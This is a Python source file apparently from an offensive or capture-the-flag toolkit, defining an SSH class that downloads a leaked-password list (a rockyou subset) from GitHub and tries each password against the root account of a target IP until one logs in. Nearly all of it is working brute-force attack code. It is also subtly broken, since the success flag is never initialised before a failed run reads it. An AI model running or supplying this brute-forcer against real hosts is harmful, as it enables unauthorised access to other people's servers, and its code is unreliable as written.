# ssh/ssh.py
import paramiko
import urllib3
from tqdm import tqdm
from pwn import *

class SSHConnection:
    def __init__(self, ip_address, port=22):
        self.ip_address = ip_address
        self.port = port
        self.ssh_client = None

    def bruteforce(self):
        """Will attempt to bruteforce the SSH connection using the rockyou password list."""
        list_passwords = self.download_passwords()

        total_attempts = len(list_passwords)
        with tqdm(
            total=total_attempts, desc="Bruteforcing SSH...", unit="attempt"
        ) as pbar:
            for password in list_passwords:
                password = password.strip("\n")
                if self.connect("root", password):
                    self.log_message(
                        f"Successfully bruteforced SSH with password {password}",
                        "success",
                    )
                    self.close()
                    self.success = True
                    break
                pbar.update(1)

        if not self.success:
            self.log_message("Bruteforce unsuccessful.", "error")
        return self.success

    def download_passwords(self):
        """Downloads and reads the rockyou password list from the web"""
        data = urllib3.PoolManager().request(
            "GET",
            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-20.txt",
        )
        list_passwords = data.data.decode("utf-8").split("\n")
        return list_passwords

    def connect(self, username, password):
        """Establishes an SSH connection."""
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh_client.connect(
                hostname=self.ip_address,
                port=self.port,
                username=username,
                password=password,
            )
            self.log_message(f"Connected to {self.ip_address} as {username}", "info")
            return True
        except paramiko.SSHException:
            pass
        return False

    def close(self):
        """Closes the SSH connection."""
        if self.ssh_client:
            self.ssh_client.close()
            self.log_message(f"Connection to {self.ip_address} closed.", "info")
            self.ssh_client = None

    def log_message(self, message, level):
        """Logs a message with a specific level."""
        colors = {
            "info": "\033[94m",  # Blue
            "success": "\033[92m",  # Green
            "warning": "\033[93m",  # Yellow
            "error": "\033[91m",  # Red
            "reset": "\033[0m",  # Reset
        }
        color = colors.get(level, colors["reset"])
        reset = colors["reset"]
        print(f"{color}[{level.upper()}] {message}{reset}")
